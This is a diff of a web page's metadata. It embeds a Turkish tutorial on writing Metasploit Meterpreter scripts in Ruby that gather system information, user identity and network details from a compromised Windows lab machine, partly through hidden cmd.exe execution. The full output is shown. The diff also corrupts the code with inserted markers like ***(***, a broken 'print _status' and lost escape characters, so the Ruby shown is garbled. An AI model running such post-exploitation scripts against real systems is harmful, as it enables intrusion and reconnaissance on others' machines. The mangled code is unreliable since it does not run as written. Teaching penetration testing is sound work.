@@ -11,9 +11,7 @@
 <link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
 <link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
 <title>MSF Meterpreter Script Düzenleme – Siberoloji</title>
-  <meta name="description" content=" Script Yazma Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne kayıt edelim.
-root@kali:~# echo “print_status(“Hello World”)” &gt; /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
-meterpreter &gt; run helloworld [*] Hello World meterpreter &gt; Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını helloworld.rb dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz." /><link rel="canonical" href="http://localhost:1313/tr/msf-meterpreter-script-duzenleme/" itemprop="url" />
+  <meta name="description" content=" Script Yazma Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne kayıt edelim. root@kali:~# echo “print_status***(*** “Hello World”***)*** ” ***&gt;*** /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım. meterpreter ***&gt;*** run helloworld ***[*** ******* ***]*** Hello World meterpreter ***&gt;*** Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını helloworld.rb dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz. print_error***(*** “this is an error!”***)*** print_line***(*** “this is a line”***)*** Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım. meterpreter ***&gt;*** run helloworld ***[*** ******* ***]*** Hello World ***[*** -] this is an error! this is a line meterpreter ***&gt;*** helloworld.rb Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır. print_status(&#34;Hello World&#34;) print_error(&#34;this is an error!&#34;) print_line(&#34;This is a line&#34;) Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır. def geninfo***(*** session***)*** begin ….. rescue ::Exception ***=&gt;*** e ….. end end Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra helloworld.rb dosyamızın içeriği aşağıdaki gibi olacaktır. def getinfo***(*** session***)*** begin sysnfo ***=*** session.sys.config.sysinfo runpriv ***=*** session.sys.config.getuid print_status***(*** &#34;Getting system information ...&#34;***)*** print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** print_status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** rescue ::Exception ***=&gt;*** e print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** end end Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri session değişkeninden alan getinfo(session) isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir. sysnfo = session.sys.config.sysinfo satırı sistem bilgisini getirirken runpriv = session.sys.config.getuid kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır. helloworld2.rb İlk oluşturduğumuz dosyaya ufak bir ilave yaparak helloworld2.rb dosyası üretelim. helloworld2.rb dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı helloworld2.rb olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır. def getinfo***(*** session***)*** begin sysnfo ***=*** session.sys.config.sysinfo runpriv ***=*** session.sys.config.getuid print_status***(*** &#34;Getting system information ...&#34;***)*** print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** print _status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** rescue ::Exception ***=&gt;*** e print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** end end getinfo***(*** client***)*** Şimdi hazırladığımız helloworld2.rb dosyamızı Meterpreter oturumunda çalıştıralım. meterpreter ***&gt;*** run helloworld2 ***[*** ******* ***]*** Getting system information ... ***[*** ******* ***]*** The target machine OS is Windows XP ***(*** Build 2600, Service Pack 3***)*** . ***[*** ******* ***]*** The computer name is Computer ***[*** ******* ***]*** Script running as WINXPVM01labuser Gördüğünüz gibi helloworld2.rb scripti ile bir takım sistem bigilerini ele etmiş olduk. helloworld3.rb Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır. def list_exec***(*** session,cmdlst***)*** print_status***(*** &#34;Running Command List ...&#34;***)*** r***=*** &#39;&#39; session.response_timeout***=*** 120 cmdlst.each ***do*** |cmd| begin print_status &#34;running command #{cmd}&#34; r ***=*** session.sys.process.execute***(*** &#34;cmd.exe /c #{cmd}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true, &#39;Channelized&#39; ***=&gt;*** true***})*** ***while*** ***(*** d ***=*** r.channel.read***)*** print_status***(*** &#34;t#{d}&#34;***)*** end r.channel.close r.close rescue ::Exception ***=&gt;*** e print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** end end end commands ***=*** ***[*** &#34;set&#34;, &#34;ipconfig /all&#34;, &#34;arp -a&#34;***]*** list_exec***(*** client,commands***)*** Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, list_exec isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon, session ve cmdlist isimli iki değişken almaktadır. cmdlist değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak cmd.exe üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için session.response_timeout=120 120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır. cmdlist dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır. commands ***=*** ***[*** “set”, “ipconfig /all”, “arp –a”] Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı list_exec(client,commands) bulunmaktadır. Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım. meterpreter ***&gt;*** run helloworld3 ***[*** ******* ***]*** Running Command List ... ***[*** ******* ***]*** running command set ***[*** ******* ***]*** ALLUSERSPROFILE***=*** C:\Documents and Settings\All Users APPDATA***=*** C:\Documents and Settings\P0WN3D\Application Data CommonProgramFiles***=*** C:\Program Files\Common Files COMPUTERNAME***=*** TARGET ComSpec***=*** C:\WINNT\system32\cmd.exe HOMEDRIVE***=*** C: HOMEPATH***=*** LOGONSERVER***=*** TARGET NUMBER_OF_PROCESSORS***=*** 1 OS***=*** Windows_NT Os2LibPath***=*** C:\WINNT\system32\os2dll; Path***=*** C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem PATHEXT***=*** .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH PROCESSOR_ARCHITECTURE***=*** x86 PROCESSOR_IDENTIFIER***=*** x86 Family 6 Model 7 Stepping 6, GenuineIntel PROCESSOR_LEVEL***=*** 6 PROCESSOR_REVISION***=*** 0706 ProgramFiles***=*** C:\Program Files PROMPT***=*** $P$G SystemDrive***=*** C: SystemRoot***=*** C:\WINNT TEMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp TMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp USERDOMAIN***=*** TARGET USERNAME***=*** P0WN3D USERPROFILE***=*** C:\Documents and Settings\P0WN3D windir***=*** C:\WINNT ***[*** ******* ***]*** running command ipconfig /all ***[*** ******* ***]*** Windows 2000 IP Configuration Host Name . . . . . . . . . . . . : target Primary DNS Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No DNS Suffix Search List. . . . . . : localdomain Ethernet adapter Local Area Connection: Connection-specific DNS Suffix . : localdomain Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter Physical Address. . . . . . . . . : 00-0C-29-85-81-55 DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes IP Address. . . . . . . . . . . . : 172.16.104.145 Subnet Mask . . . . . . . . . . . : 255.255.255.0 Default Gateway . . . . . . . . . : 172.16.104.2 DHCP Server . . . . . . . . . . . : 172.16.104.254 DNS Servers . . . . . . . . . . . : 172.16.104.2 Primary WINS Server . . . . . . . : 172.16.104.2 Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM ***[*** ******* ***]*** running command arp -a ***[*** ******* ***]*** Interface: 172.16.104.145 on Interface 0x1000003 Internet Address Physical Address Type 172.16.104.2 00-50-56-eb-db-06 dynamic 172.16.104.150 00-0c-29-a7-f1-c5 dynamic meterpreter ***&gt;*** Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir." /><link rel="canonical" href="http://localhost:1313/tr/msf-meterpreter-script-duzenleme/" itemprop="url" />
 
 <meta property="og:title" content="MSF Meterpreter Script Düzenleme" />
 <meta property="og:description" content="
@@ -22,37 +20,242 @@ Script Yazma
 
 Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve&nbsp;helloworld.rb&nbsp;olarak&nbsp;/usr/share/metasploit-framework/scripts/meterpreter&nbsp;klasörüne kayıt edelim.
 
-root@kali:~# echo “print_status(“Hello World”)” &gt; /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
+root@kali:~# echo “print_status***(*** “Hello World”***)*** ” ***&gt;***  /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
 
 
 
 Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
 
-meterpreter &gt; run helloworld
-[*] Hello World
-meterpreter &gt;
+meterpreter ***&gt;***  run helloworld
+***[*** ******* ***]***  Hello World
+meterpreter ***&gt;*** 
 
 
 
-Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını&nbsp;helloworld.rb&nbsp;dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz." />
+Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını&nbsp;helloworld.rb&nbsp;dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.
+
+print_error***(*** “this is an error!”***)*** 
+print_line***(*** “this is a line”***)*** 
+
+
+
+Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım.
+
+meterpreter ***&gt;***  run helloworld
+***[*** ******* ***]***  Hello World
+***[*** -] this is an error!
+this is a line
+meterpreter ***&gt;*** 
+
+
+
+helloworld.rb 
+
+
+Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır.
+
+print_status(&#34;Hello World&#34;)
+print_error(&#34;this is an error!&#34;)
+print_line(&#34;This is a line&#34;)
+
+
+
+Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır.
+
+ def geninfo***(*** session***)*** 
+    begin
+    …..
+    rescue ::Exception ***=&gt;***  e
+    …..
+    end
+ end
+
+
+
+Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra&nbsp;helloworld.rb&nbsp;dosyamızın içeriği aşağıdaki gibi olacaktır.
+
+ def getinfo***(*** session***)*** 
+    begin
+       sysnfo ***=***  session.sys.config.sysinfo
+       runpriv ***=***  session.sys.config.getuid
+       print_status***(*** &#34;Getting system information ...&#34;***)*** 
+       print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** 
+       print_status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** 
+       print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** 
+    rescue ::Exception ***=&gt;***  e
+       print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** 
+    end
+ end
+
+
+
+Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri&nbsp;session&nbsp;değişkeninden alan&nbsp;getinfo(session)&nbsp;isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir.&nbsp;sysnfo = session.sys.config.sysinfo&nbsp;satırı sistem bilgisini getirirken&nbsp;runpriv = session.sys.config.getuid&nbsp;kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır.
+
+helloworld2.rb 
+
+
+İlk oluşturduğumuz dosyaya ufak bir ilave yaparak&nbsp;helloworld2.rb&nbsp;dosyası üretelim.&nbsp;helloworld2.rb&nbsp;dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı&nbsp;helloworld2.rb&nbsp;olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.
+
+ def getinfo***(*** session***)*** 
+    begin
+       sysnfo ***=***  session.sys.config.sysinfo
+       runpriv ***=***  session.sys.config.getuid
+       print_status***(*** &#34;Getting system information ...&#34;***)*** 
+       print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** 
+       print _status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** 
+       print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** 
+ rescue ::Exception ***=&gt;***  e
+       print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** 
+    end
+ end
+
+ getinfo***(*** client***)*** 
+
+
+
+Şimdi hazırladığımız&nbsp;helloworld2.rb&nbsp;dosyamızı Meterpreter oturumunda çalıştıralım.
+
+ meterpreter ***&gt;***  run helloworld2
+ ***[*** ******* ***]***  Getting system information ...
+ ***[*** ******* ***]***      The target machine OS is Windows XP ***(*** Build 2600, Service Pack 3***)*** .
+ ***[*** ******* ***]***      The computer name is Computer
+ ***[*** ******* ***]***      Script running as WINXPVM01labuser
+
+
+
+Gördüğünüz gibi&nbsp;helloworld2.rb&nbsp;scripti ile bir takım sistem bigilerini ele etmiş olduk.
+
+helloworld3.rb 
+
+
+Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.
+
+def list_exec***(*** session,cmdlst***)*** 
+    print_status***(*** &#34;Running Command List ...&#34;***)*** 
+    r***=*** &#39;&#39;
+    session.response_timeout***=*** 120
+    cmdlst.each ***do***  |cmd|
+       begin
+          print_status &#34;running command #{cmd}&#34;
+          r ***=***  session.sys.process.execute***(*** &#34;cmd.exe /c #{cmd}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;***  true, &#39;Channelized&#39; ***=&gt;***  true***})*** 
+          ***while*** ***(*** d ***=***  r.channel.read***)*** 
+ 
+             print_status***(*** &#34;t#{d}&#34;***)*** 
+          end
+          r.channel.close
+          r.close
+       rescue ::Exception ***=&gt;***  e
+          print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** 
+       end
+    end
+ end
+ 
+ commands ***=***  ***[***  &#34;set&#34;,
+    &#34;ipconfig  /all&#34;,
+    &#34;arp -a&#34;***]*** 
+ 
+ list_exec***(*** client,commands***)*** 
+
+
+
+Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle,&nbsp;list_exec&nbsp;isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon,&nbsp;session&nbsp;ve&nbsp;cmdlist&nbsp;isimli iki değişken almaktadır.&nbsp;cmdlist&nbsp;değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak&nbsp;cmd.exe&nbsp;üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için&nbsp;session.response_timeout=120&nbsp;120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.
+
+cmdlist&nbsp;dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.
+
+ commands ***=***  ***[***  “set”,
+    “ipconfig  /all”,
+    “arp –a”]
+
+
+
+Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı&nbsp;list_exec(client,commands)&nbsp;bulunmaktadır.
+
+Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.
+
+ meterpreter ***&gt;***  run helloworld3
+ ***[*** ******* ***]***  Running Command List ...
+ ***[*** ******* ***]***      running command set
+ ***[*** ******* ***]***      ALLUSERSPROFILE***=*** C:\Documents and Settings\All Users
+ APPDATA***=*** C:\Documents and Settings\P0WN3D\Application Data
+ CommonProgramFiles***=*** C:\Program Files\Common Files
+ COMPUTERNAME***=*** TARGET
+ ComSpec***=*** C:\WINNT\system32\cmd.exe
+ HOMEDRIVE***=*** C:
+ HOMEPATH***=*** 
+ LOGONSERVER***=*** TARGET
+ NUMBER_OF_PROCESSORS***=*** 1
+ OS***=*** Windows_NT
+ Os2LibPath***=*** C:\WINNT\system32\os2dll;
+ Path***=*** C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem
+ PATHEXT***=*** .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH
+ PROCESSOR_ARCHITECTURE***=*** x86
+ PROCESSOR_IDENTIFIER***=*** x86 Family 6 Model 7 Stepping 6, GenuineIntel
+ PROCESSOR_LEVEL***=*** 6
+ PROCESSOR_REVISION***=*** 0706
+ ProgramFiles***=*** C:\Program Files
+ PROMPT***=*** $P$G
+ SystemDrive***=*** C:
+ SystemRoot***=*** C:\WINNT
+ TEMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ TMP***=*** C:\DOCUME~1\P0WN3D\LOCALS~1\Temp
+ USERDOMAIN***=*** TARGET
+ USERNAME***=*** P0WN3D
+ USERPROFILE***=*** C:\Documents and Settings\P0WN3D
+ windir***=*** C:\WINNT
+ 
+ ***[*** ******* ***]***      running command ipconfig  /all
+ ***[*** ******* ***]***      
+ Windows 2000 IP Configuration
+ 
+ Host Name . . . . . . . . . . . . : target
+ Primary DNS Suffix  . . . . . . . : 
+ Node Type . . . . . . . . . . . . : Hybrid
+ IP Routing Enabled. . . . . . . . : No
+ WINS Proxy Enabled. . . . . . . . : No
+ DNS Suffix Search List. . . . . . : localdomain
+ 
+ Ethernet adapter Local Area Connection:
+ 
+ Connection-specific DNS Suffix  . : localdomain
+ Description . . . . . . . . . . . : VMware Accelerated AMD PCNet Adapter
+ Physical Address. . . . . . . . . : 00-0C-29-85-81-55
+ DHCP Enabled. . . . . . . . . . . : Yes
+ Autoconfiguration Enabled . . . . : Yes
+ IP Address. . . . . . . . . . . . : 172.16.104.145
+ Subnet Mask . . . . . . . . . . . : 255.255.255.0
+ Default Gateway . . . . . . . . . : 172.16.104.2
+ DHCP Server . . . . . . . . . . . : 172.16.104.254
+ DNS Servers . . . . . . . . . . . : 172.16.104.2
+ Primary WINS Server . . . . . . . : 172.16.104.2
+ Lease Obtained. . . . . . . . . . : Tuesday, August 25, 2009 10:53:48 PM
+ Lease Expires . . . . . . . . . . : Tuesday, August 25, 2009 11:23:48 PM
+ 
+ ***[*** ******* ***]***      running command arp -a
+ ***[*** ******* ***]***      
+ Interface: 172.16.104.145 on Interface 0x1000003
+ Internet Address      Physical Address      Type
+ 172.16.104.2          00-50-56-eb-db-06     dynamic   
+ 172.16.104.150        00-0c-29-a7-f1-c5     dynamic   
+ 
+ meterpreter ***&gt;*** 
+
+
+
+Gördüğünüz gibi, Ruby kodlarıyla script oluşturmak aslında çok kolay. İlk başta kodlar biraz karışık gelebilir ancak mevcut koldarı biraz çalıştığınızda aşinalık kazanacaksınız. Devamında yapmanız gereken, kod örneklerinden faydalanarak kendi script dosyanızı oluşturmak ve denemektir." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="http://localhost:1313/tr/msf-meterpreter-script-duzenleme/" /><meta property="article:section" content="blog" />
 <meta property="article:published_time" content="2017-06-14T13:49:00+00:00" />
 <meta property="article:modified_time" content="2017-06-14T13:49:00+00:00" />
 
   <meta itemprop="name" content="MSF Meterpreter Script Düzenleme">
-  <meta itemprop="description" content="Script Yazma Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne kayıt edelim.
-root@kali:~# echo “print_status(“Hello World”)” &gt; /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
-meterpreter &gt; run helloworld [*] Hello World meterpreter &gt; Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını helloworld.rb dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.">
+  <meta itemprop="description" content="Script Yazma Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve helloworld.rb olarak /usr/share/metasploit-framework/scripts/meterpreter klasörüne kayıt edelim. root@kali:~# echo “print_status***(*** “Hello World”***)*** ” ***&gt;*** /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım. meterpreter ***&gt;*** run helloworld ***[*** ******* ***]*** Hello World meterpreter ***&gt;*** Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını helloworld.rb dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz. print_error***(*** “this is an error!”***)*** print_line***(*** “this is a line”***)*** Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım. meterpreter ***&gt;*** run helloworld ***[*** ******* ***]*** Hello World ***[*** -] this is an error! this is a line meterpreter ***&gt;*** helloworld.rb Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır. print_status(&#34;Hello World&#34;) print_error(&#34;this is an error!&#34;) print_line(&#34;This is a line&#34;) Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır. def geninfo***(*** session***)*** begin ….. rescue ::Exception ***=&gt;*** e ….. end end Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra helloworld.rb dosyamızın içeriği aşağıdaki gibi olacaktır. def getinfo***(*** session***)*** begin sysnfo ***=*** session.sys.config.sysinfo runpriv ***=*** session.sys.config.getuid print_status***(*** &#34;Getting system information ...&#34;***)*** print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** print_status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** rescue ::Exception ***=&gt;*** e print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** end end Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, değerleri session değişkeninden alan getinfo(session) isimli bir foksiyon tanımladık. Bu session değişkeni, bir takım metodları ihtiva etmektedir. sysnfo = session.sys.config.sysinfo satırı sistem bilgisini getirirken runpriv = session.sys.config.getuid kullanıcı bilgisini elde etmekte kullanılmaktadır. Ayrıca, hata durumlarını yönetici istisna yöneticisi bulunmaktadır. helloworld2.rb İlk oluşturduğumuz dosyaya ufak bir ilave yaparak helloworld2.rb dosyası üretelim. helloworld2.rb dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı helloworld2.rb olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır. def getinfo***(*** session***)*** begin sysnfo ***=*** session.sys.config.sysinfo runpriv ***=*** session.sys.config.getuid print_status***(*** &#34;Getting system information ...&#34;***)*** print_status***(*** &#34;tThe target machine OS is #{sysnfo[&#39;OS&#39;]}&#34;***)*** print _status***(*** &#34;tThe computer name is #{&#39;Computer&#39;} &#34;***)*** print_status***(*** &#34;tScript running as #{runpriv}&#34;***)*** rescue ::Exception ***=&gt;*** e print_error***(*** &#34;The following error was encountered #{e}&#34;***)*** end end getinfo***(*** client***)*** Şimdi hazırladığımız helloworld2.rb dosyamızı Meterpreter oturumunda çalıştıralım. meterpreter ***&gt;*** run helloworld2 ***[*** ******* ***]*** Getting system information ... ***[*** ******* ***]*** The target machine OS is Windows XP ***(*** Build 2600, Service Pack 3***)*** . ***[*** ******* ***]*** The computer name is Computer ***[*** ******* ***]*** Script running as WINXPVM01labuser Gördüğünüz gibi helloworld2.rb scripti ile bir takım sistem bigilerini ele etmiş olduk. helloworld3.rb Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır. def list_exec***(*** session,cmdlst***)*** print_status***(*** &#34;Running Command List ...&#34;***)*** r***=*** &#39;&#39; session.response_timeout***=*** 120 cmdlst.each ***do*** |cmd| begin print_status &#34;running command #{cmd}&#34; r ***=*** session.sys.process.execute***(*** &#34;cmd.exe /c #{cmd}&#34;, nil, ***{*** &#39;Hidden&#39; ***=&gt;*** true, &#39;Channelized&#39; ***=&gt;*** true***})*** ***while*** ***(*** d ***=*** r.channel.read***)*** print_status***(*** &#34;t#{d}&#34;***)*** end r.channel.close r.close rescue ::Exception ***=&gt;*** e print_error***(*** &#34;Error Running Command #{cmd}: #{e.class} #{e}&#34;***)*** end end end commands ***=*** ***[*** &#34;set&#34;, &#34;ipconfig /all&#34;, &#34;arp -a&#34;***]*** list_exec***(*** client,commands***)*** Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, list_exec isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon, session ve cmdlist isimli iki değişken almaktadır. cmdlist değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak cmd.exe üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için session.response_timeout=120 120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır. cmdlist dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır. commands ***=*** ***[*** “set”, “ipconfig /all”, “arp –a”] Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı list_exec(client,commands) bulunmaktadır. Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım. meterpreter ***&gt;*** run helloworld3 ***[*** ******* ***]*** Running Command List ... ***[*** ******* ***]*** running command set ***[*** ******* ***]*** ALLUSERSPROFILE***=*** C:\Documents and Settings\All Users APPDATA***=*** C:\Documents and Settings\P0WN3D\Application Data CommonProgramFiles***=*** C:\Program Files\Common Files COMPUTERNAME***=*** TARGET ComSpec***=*** C:\WINNT\system32\cmd.exe HOMEDRIVE***=*** C: HOMEPATH***=*** LOGONSERVER***=*** TARGET NUMBER_OF_PROCESSORS***=*** 1 OS***=*** Windows_NT Os2LibPath***=*** C:\WINNT\system32\os2dll; Path***=*** C:\WINNT\system32;C:\WINNT;C:\WINNT\System32\Wbem PATHEXT***=*** .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH PROCESSOR_ARCHITECTURE***=*** x86 PROCESSOR_IDENTIFIER***=*** x86 Family 6 Model 7 Stepping 6, GenuineIntel PROCESSOR_LEVEL***=*** 6 PROCESSOR_REVISION***=*** 0706 